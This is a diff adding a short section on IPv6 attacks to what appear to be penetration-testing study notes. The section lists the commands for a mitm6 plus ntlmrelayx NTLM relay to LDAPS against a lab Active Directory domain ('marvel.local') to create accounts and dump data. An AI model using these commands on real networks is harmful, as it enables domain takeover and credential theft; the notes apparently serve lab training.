@@ -125,3 +125,19 @@ msf6 exploit(windows/smb/webexec) > use windows/smb/psexec (noisy - antivirus)
 
 --------------------
 IPv6 ATTACKS:
+
+passa DNS -> Domain Controller DC
+NTLM -> DC create account (mitm6 man in the middle 6)
+
+└─# git clone https://github.com/fox-it/mitm6
+pip3 install .
+
+-> LDAPS add AD certificate Server
+
+└─# mitm6 -d marvel.local                    
+
+└─# ntlmrelayx.py -6 -t ldaps://192.168.0.30 -wh fakewpad.marvel.local -l lootme
+
+cd lootme - files
+
+
